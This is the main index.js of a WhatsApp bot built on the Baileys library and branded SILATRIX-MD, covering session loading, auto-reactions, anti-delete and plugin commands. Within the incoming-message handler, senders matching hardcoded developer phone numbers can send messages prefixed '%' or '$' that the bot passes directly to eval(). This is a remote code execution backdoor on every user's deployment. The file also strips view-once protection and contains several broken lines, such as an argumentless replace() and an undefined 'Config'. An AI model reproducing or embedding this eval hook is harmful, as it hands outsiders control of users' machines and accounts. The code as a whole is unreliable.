// index.js (complete - updated)
// NOTE: adjust any paths / config values as needed for your environment.

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID, 
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;

const ownerNumber = ['18494967948'];

// temp cache folder
const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}
const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) return console.error('Temp dir read error:', err);
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) console.error('Temp file remove error:', err);
      });
    }
  });
};
// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if(!config.SESSION_ID) {
    console.log('Please add your session to SESSION_ID env !!');
  } else {
    const sessdata = config.SESSION_ID.replace("POPKID;;;", '');
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
    filer.download((err, data) => {
      if(err) {
        console.error('Error downloading session from Mega:', err);
      } else {
        fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
          console.log("Session downloaded ✅");
        });
      }
    });
  }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Create an in-memory store for contacts/messages (used later)
const store = makeInMemoryStore ? makeInMemoryStore({}) : { bind: () => {} };

//=============================================
async function connectToWA() {
  try {
    console.log("Connecting to WhatsApp ⏳️...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
    // fetchLatestBaileysVersion usually returns an array; using as provided originally.
    const { version } = await fetchLatestBaileysVersion() || {};
  
    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    });

    // bind store to events if available
    try {
      if (store && typeof store.bind === 'function') store.bind(conn.ev);
    } catch (e) {
      console.warn('Store bind failed:', e);
    }

    // Save creds when updated
    conn.ev.on('creds.update', saveCreds);

    // ======= connection.update handler (defensive + reconnect/backoff) =======
    conn.ev.on('connection.update', (update) => {
      try {
        const { connection: connState, lastDisconnect } = update;
        console.log('connection.update ->', connState);

        // Debug raw lastDisconnect shape (if present)
        if (lastDisconnect) {
          console.log('lastDisconnect (raw):', JSON.stringify(lastDisconnect, null, 2));
        }

        if (connState === 'close') {
          // safe access using optional chaining
          const statusCode = lastDisconnect?.error?.output?.statusCode ?? null;
          console.log('Disconnect statusCode:', statusCode);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log('Logged out detected. Clearing session files and stopping connection.');
            try {
              const sessionDir = path.join(__dirname, 'sessions');
              if (fs.existsSync(sessionDir)) {
                fs.rmSync(sessionDir, { recursive: true, force: true });
                console.log('Session directory removed:', sessionDir);
              } else {
                console.log('No session directory found to remove.');
              }
            } catch (e) {
              console.error('Error clearing session dir:', e);
            }
            // Do not auto reconnect when logged out; require re-authentication
            return;
          } else {
            console.log('Disconnected unexpectedly — attempting reconnect in 5s.');
            setTimeout(() => {
              try {
                connectToWA();
              } catch (e) {
                console.error('Reconnect failed to start:', e);
              }
            }, 5000);
          }
        } else if (connState === 'open') {
          console.log('🧬 Installing Plugins');
          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (path.extname(plugin).toLowerCase() == ".js") {
              try {
                require("./plugins/" + plugin);
              } catch (e) {
                console.error(`Failed to load plugin ${plugin}:`, e);
              }
            }
          });
          console.log('Plugins installed successful ✅');
          console.log('𝙎𝙄𝙇𝘼𝙏𝙍𝙄𝙓-𝙈𝘿 CONNECTED SUCCESSFULLY ✅');

          let up = `*╭┈───────────────╮*
*│ ◦* *𝙎𝙄𝙇𝘼𝙏𝙍𝙄𝙓 𝙈𝘿 ᴄᴏɴᴇᴄᴛᴇᴅ*
*│ ◦* *ᴅᴇᴠ* : *𝙎𝙞𝙡𝙖-𝙏𝙚𝙘𝙝*
*│ ◦* *sᴀᴛᴜs* : *ᴏɴʟʏ*
*│ ◦* *ɴᴜᴍʙᴇʀ* : +255789661031
*│ ◦* *ɴᴜᴍʙᴇʀ* : +255612491554
*│  ◦* *ᴘʀᴇғɪx: ${config.PREFIX}*
*│  ◦* *ᴍᴏᴅᴇ: ${config.MODE}*
*│  ◦* *ᴛʏᴘᴇ : ${config.PREFIX}menu* 
*╰┈───────────────╯*
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝙎𝙞𝙡𝙖-𝙏𝙚𝙘𝙝 *`;
          try {
            conn.sendMessage(conn.user?.id || conn.user, { image: { url: `https://files.catbox.moe/mi50jn.jpeg` }, caption: up });
          } catch (e) {
            console.warn('Send welcome message failed:', e);
          }
        }
      } catch (err) {
        console.error('Error in connection.update handler:', err);
      }
    });
    // ========================================================================

    // messages.update handler for AntiDelete
    conn.ev.on('messages.update', async updates => {
      for (const update of updates) {
        if (update.update && update.update.message === null) {
          console.log("Delete Detected:", JSON.stringify(update, null, 2));
          await AntiDelete(conn, updates).catch(e => console.error('AntiDelete error:', e));
        }
      }
    });

    // group participant events
    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

    // messages.upsert (incoming messages)
    conn.ev.on('messages.upsert', async (mekArg) => {
      try {
        let mek = mekArg.messages && mekArg.messages[0];
        if (!mek) return;
        if (!mek.message) return;

        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
          ? mek.message.ephemeralMessage.message 
          : mek.message;

        if (config.READ_MESSAGE === 'true') {
          try {
            await conn.readMessages([mek.key]);
            console.log(`Marked message from ${mek.key.remoteJid} as read.`);
          } catch (e) {
            console.warn('Mark read failed:', e);
          }
        }

        if(mek.message.viewOnceMessageV2)
          mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
          await conn.readMessages([mek.key]).catch(e=>console.error('Auto status seen error:', e));
        }

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
          const jawadlike = await conn.decodeJid(conn.user.id);
          const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
          const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
          try {
            await conn.sendMessage(mek.key.remoteJid, {
              react: {
                text: randomEmoji,
                key: mek.key,
              } 
            }, { statusJidList: [mek.key.participant, jawadlike] });
          } catch (e) {
            console.warn('Auto status react failed:', e);
          }
        }                       

        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
          const user = mek.key.participant;
          const text = `${config.AUTO_STATUS_MSG}`;
          await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek }).catch(e=>console.error('Auto status reply failed:', e));
        }

        await Promise.all([ saveMessage(mek).catch(e=>console.error('saveMessage err:', e)) ]);

        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const from = mek.key.remoteJid;
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
        const isCmd = typeof body === 'string' && body.startsWith(prefix);
        var budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const text = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => ({})) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? (groupMetadata.participants || []) : '';
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isReact = m.message?.reactionMessage ? true : false;
        const reply = (teks) => { conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(e=>console.error('reply err:', e)); };

        const udp = botNumber.split('@')[0];
        const jawad = ('255789661031', '255612491554', '255789661031');
        let isCreator = [udp, jawad, config.DEV]
          .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
          .includes(mek.sender);

        if (isCreator && typeof mek.text === 'string' && mek.text.startsWith('%')) {
          let code = budy.slice(2);
          if (!code) {
            reply(`Provide me with a query to run Master!`);
            return;
          }
          try {
            let resultTest = eval(code);
            if (typeof resultTest === 'object')
              reply(util.format(resultTest));
            else reply(util.format(resultTest));
          } catch (err) {
            reply(util.format(err));
          }
          return;
        }

        if (isCreator && typeof mek.text === 'string' && mek.text.startsWith('$')) {
          let code = budy.slice(2);
          if (!code) {
            reply(`Provide me with a query to run Master!`);
            return;
          }
          try {
            let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
            let h = util.format(resultTest);
            if (h === undefined) return console.log(h);
            else reply(h);
          } catch (err) {
            if (err === undefined) return console.log('error'); else reply(util.format(err));
          }
          return;
        }

        // owner react (example)
        if (senderNumber.includes("5090000000") && !isReact) {
          const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction).catch(e=>console.error('owner react err:', e));
        }

        // Auto React for all messages (public and owner)
        if (!isReact && config.AUTO_REACT === 'true') {
          const reactions = [ '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌' ];
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction).catch(e=>console.error('auto react err:', e));
        }

        // Custom React
        if (!isReact && config.CUSTOM_REACT === 'true') {
          const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction).catch(e=>console.error('custom react err:', e));
        }

        // WORKTYPE gating
        if(!isOwner && config.MODE === "private") return;
        if(!isOwner && isGroup && config.MODE === "inbox") return;
        if(!isOwner && !isGroup && config.MODE === "groups") return;

        // Command handling
        const events = require('./command');
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
          const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
          if (cmd) {
            if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }}).catch(e=>console.error('cmd react err:', e));

            try {
              cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } catch (e) {
              console.error("[PLUGIN ERROR] " + e);
            }
          }
        }

        // events.commands mapping (on/trigger handlers)
        events.commands.map(async(command) => {
          try {
            if (body && command.on === "body") {
              command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (mek.q && command.on === "text") {
              command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
              command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (command.on === "sticker" && mek.type === "stickerMessage") {
              command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            }
          } catch (e) {
            console.error('events.command handler error:', e);
          }
        });

      } catch (err) {
        console.error('Error processing incoming message:', err);
      }
    });

    // Utility / helper methods on conn (kept mostly intact, minor defensive guards)

    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return ((decode.user && decode.server && decode.user + '@' + decode.server) || jid);
      } else return jid;
    };

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype;
      if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
        vtype = Object.keys(message.message.viewOnceMessage.message)[0];
        delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
        delete message.message.viewOnceMessage.message[vtype].viewOnce;
        message.message = { ...message.message.viewOnceMessage.message };
      }

      let mtype = Object.keys(message.message)[0];
      let content = await generateForwardMessageContent(message, forceForward);
      let ctype = Object.keys(content)[0];
      let context = {};
      if (mtype != "conversation") context = message.message[mtype].contextInfo;
      content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
      const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options, ...(options.contextInfo ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } } : {}) } : {});
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
      return waMessage;
    };

    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message;
      let mime = (message.msg || message).mimetype || '';
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
      const stream = await downloadContentFromMessage(quoted, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      let type = await FileType.fromBuffer(buffer);
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
      await fs.writeFileSync(trueFileName, buffer);
      return trueFileName;
    };

    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || '';
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
      const stream = await downloadContentFromMessage(message, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      return buffer;
    };

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let mime = '';
      try {
        let res = await axios.head(url);
        mime = res.headers['content-type'] || '';
      } catch (e) {
        console.error('sendFileUrl axios.head error:', e);
        mime = '';
      }
      if (mime.split("/")[1] === "gif") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
      }
      let type = mime.split("/")[0] + "Message";
      if (mime === "application/pdf") {
        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "image") {
        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "video") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "audio") {
        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
      }
    };

    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      let mtype = Object.keys(copy.message)[0];
      let isEphemeral = mtype === 'ephemeralMessage';
      if (isEphemeral) mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
      let content = msg[mtype];
      if (typeof content === 'string') msg[mtype] = text || content;
      else if (content.caption) content.caption = text || content.caption;
      else if (content.text) content.text = text || content.text;
      if (typeof content !== 'string') msg[mtype] = { ...content, ...options };
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
      copy.key.remoteJid = jid;
      copy.key.fromMe = sender === conn.user.id;
      return proto.WebMessageInfo.fromObject(copy);
    };

    conn.getFile = async(PATH, save) => {
      let res;
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
      let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' };
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
      if (data && save) fs.promises.writeFile(filename, data);
      return { res, filename, size: await getSizeMedia(data), ...type, data };
    };

    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true);
      let { filename, size, ext, mime, data } = types;
      let type = '', mimetype = mime, pathFile = filename;
      if (options.asDocument) type = 'document';
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif.js');
        let media = { mimetype: mime, data };
        pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] });
        await fs.promises.unlink(filename);
        type = 'sticker';
        mimetype = 'image/webp';
      } else if (/image/.test(mime)) type = 'image';
      else if (/video/.test(mime)) type = 'video';
      else if (/audio/.test(mime)) type = 'audio';
      else type = 'document';
      await conn.sendMessage(jid, { [type]: { url: pathFile }, mimetype, fileName, ...options }, { quoted, ...options });
      return fs.promises.unlink(pathFile);
    };

    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
    };

    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true);
      let { mime, ext, res, data, filename } = types;
      if (res && res.status !== 200 || (data && data.length <= 65536)) {
        try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json; }
      }
      let type = '', mimetype = mime, pathFile = filename;
      if (options.asDocument) type = 'document';
      if (options.asSticker || /webp/.test(mime)) {
        let { writeExif } = require('./exif');
        let media = { mimetype: mime, data };
        pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] });
        await fs.promises.unlink(filename);
        type = 'sticker';
        mimetype = 'image/webp';
      } else if (/image/.test(mime)) type = 'image';
      else if (/video/.test(mime)) type = 'video';
      else if (/audio/.test(mime)) type = 'audio';
      else type = 'document';
      await conn.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options });
      return fs.promises.unlink(pathFile);
    };

    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };

    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };

    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted });

    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
    };

    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted });

    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = { text, footer, buttons, headerType: 2, ...options };
      conn.sendMessage(jid, buttonMessage, { quoted, ...options }).catch(e=>console.error('sendButtonText err:', e));
    };

    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
          hydratedTemplate: {
            imageMessage: message.imageMessage,
            "hydratedContentText": text,
            "hydratedFooterText": footer,
            "hydratedButtons": but
          }
        }
      }), options);
      conn.relayMessage(jid, template.message, { messageId: template.key.id });
    };

    conn.getName = (jid, withoutContact = false) => {
      id = conn.decodeJid(jid);
      withoutContact = conn.withoutContact || withoutContact;
      let v;
      if (id.endsWith('@g.us'))
        return new Promise(async resolve => {
          v = store.contacts[id] || {};
          if (!(v.name?.notify || v.subject)) v = conn.groupMetadata(id) || {};
          resolve(v.name || v.subject || id);
        });
      else
        v = id === '0@s.whatsapp.net' ? { id, name: 'WhatsApp' } : id === conn.decodeJid(conn.user.id) ? conn.user : store.contacts[id] || {};
      return ((withoutContact ? '' : v.name) || v.subject || v.verifiedName || id);
    };

    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
      let list = [];
      for (let i of kon) {
        list.push({
          displayName: await conn.getName(i + '@s.whatsapp.net'),
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName || ''}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nEND:VCARD`,
        });
      }
      conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted }).catch(e=>console.error('sendContact err:', e));
    };

    conn.setStatus = status => {
      conn.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] });
      return status;
    };

    conn.serializeM = mek => sms(conn, mek, store);

    // return the connection so tests or other modules can use it if needed
    return conn;

  } catch (err) {
    console.error('connectToWA general error:', err);
    // optional: retry connection after a delay on unexpected error
    setTimeout(() => connectToWA().catch(e => console.error('retry connectToWA failed:', e)), 5000);
  }
}

app.get("/", (req, res) => {
  res.send("𝙎𝙄𝙇𝘼𝙏𝙍𝙄𝙓-𝙈𝘿 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 ✅");
});
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
setTimeout(() => { connectToWA(); }, 4000);
